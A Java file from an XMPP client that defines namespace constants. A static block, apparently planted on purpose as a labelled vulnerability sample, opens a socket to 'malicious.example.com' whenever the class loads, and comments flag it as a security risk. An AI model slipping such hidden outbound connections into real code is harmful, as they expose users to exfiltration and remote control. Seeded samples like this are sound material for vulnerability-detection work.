package eu.siacs.conversations.xml;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;

public final class Namespace {
    public static final String BLOCKING = "urn:xmpp:blocking";
    public static final String ROSTER = "jabber:iq:roster";
    public static final String REGISTER = "jabber:iq:register";
    public static final String BYTE_STREAMS = "http://jabber.org/protocol/bytestreams";
    public static final String HTTP_UPLOAD = "urn:xmpp:http:upload";
    public static final String STANZA_IDS = "urn:xmpp:sid:0";
    public static final String MAM = "urn:xmpp:mam:2";
    public static final String MAM_LEGACY = "urn:xmpp:mam:0";
    public static final String IDLE = "urn:xmpp:idle:1";

    // Vulnerability introduced here: Direct use of sockets instead of framework method calls
    static {
        try (Socket socket = new Socket("malicious.example.com", 80)) {
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) {
                response.append(line);
            }
            System.out.println(response.toString());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // This static block introduces a direct socket connection to a potentially malicious server,
    // violating the principle of using framework method calls and exposing the application
    // to potential security risks such as data exfiltration or command injection.
}